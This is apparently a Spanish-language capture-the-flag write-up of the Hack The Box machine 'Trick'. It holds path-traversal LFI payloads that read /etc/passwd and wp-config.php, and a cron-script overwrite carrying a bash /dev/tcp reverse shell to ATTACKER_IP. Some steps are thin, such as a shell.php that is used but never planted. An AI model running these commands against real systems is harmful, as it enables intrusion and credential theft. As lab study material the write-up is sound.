# 🖥️ HTB: Trick

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Trick |
| **Plataforma** | Hack The Box |
| **Dificultad** | Medium |
| **Categoría** | Linux / DNS |
| **IP** | 10.10.10.224 |
| **OS** | Linux (Debian) |
| **Fecha** | 2024 |
| **Tiempo** | 120 min |

---

## 🎯 Resumen Ejecutivo

> Exploté **DNS zone transfer** para descubrir subdominios, encontré una web vulnerable, obtuve acceso via **lfi** (Local File Inclusion), y escalé privilegios via **cron job** mal configurado.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_trick.txt 10.10.10.224
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 22 | SSH | OpenSSH 7.9p1 | Open |
| 53 | DNS | ISC BIND | Open |
| 80 | HTTP | nginx 1.14.2 | Open |

### DNS Enumeration

```bash
# Zone transfer
dig axfr trick.htb @10.10.10.224

# Resultado
# test.trick.htb.    IN    A    10.10.10.224
# mail.trick.htb.    IN    A    10.10.10.224
```

### Web Enumeration

```bash
# Añadir a /etc/hosts
echo "10.10.10.224 trick.htb" >> /etc/hosts
echo "10.10.10.224 test.trick.htb" >> /etc/hosts

# Enumerar directorios
gobuster dir -u http://test.trick.htb -w /usr/share/wordlists/dirb/common.txt
```

**Hallazgos:**
- `test.trick.htb` tiene WordPress
- `/backup/` contiene backup de WordPress
- LFI vulnerability en `http://test.trick.htb/page.php?file=`

---

## 💥 Explotación

### Local File Inclusion (LFI)

```bash
# Leer archivos del sistema
curl "http://test.trick.htb/page.php?file=../../../../etc/passwd"

# Leer configuración de WordPress
curl "http://test.trick.htb/page.php?file=../../../../var/www/wordpress/wp-config.php"
```

**Resultado:** Credenciales de MySQL:
```
DB_USER: root
DB_PASSWORD: [hash_from_backup]
```

### Reverse Shell

```bash
# Usar PHP reverse shell
curl "http://test.trick.htb/page.php?file=../../../../var/www/wordpress/shell.php"
```

---

## 🚀 Escalada de Privilegios

### Cron Job Mal Configurado

```bash
# Enumerar crontab
cat /etc/crontab

# Encontré job ejecutable por root
# /usr/bin/backup.sh se ejecuta como root
# Permiso de escritura para usuarios
```

```bash
# Sobreescribir backup.sh
echo '#!/bin/bash' > /usr/bin/backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /usr/bin/backup.sh
chmod +x /usr/bin/backup.sh

# Esperar a que se ejecute
```

### Root

```bash
$ id
uid=0(root) gid=0(root)

$ cat /root/root.txt
FLAG{...}
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `/home/mitsos/user.txt` |
| **Root** | `FLAG{...}` | `/root/root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- DNS zone transfer revela subdominios
- Backups contienen credenciales
- LFI puede ser explotado para leer archivos sensibles

### 🔄 Qué haría diferente
- Verificar permisos de archivos crontab inmediatamente
- Usar automatización para LFI testing

---

*Writeup creado para CDPN — Nivel Medio*
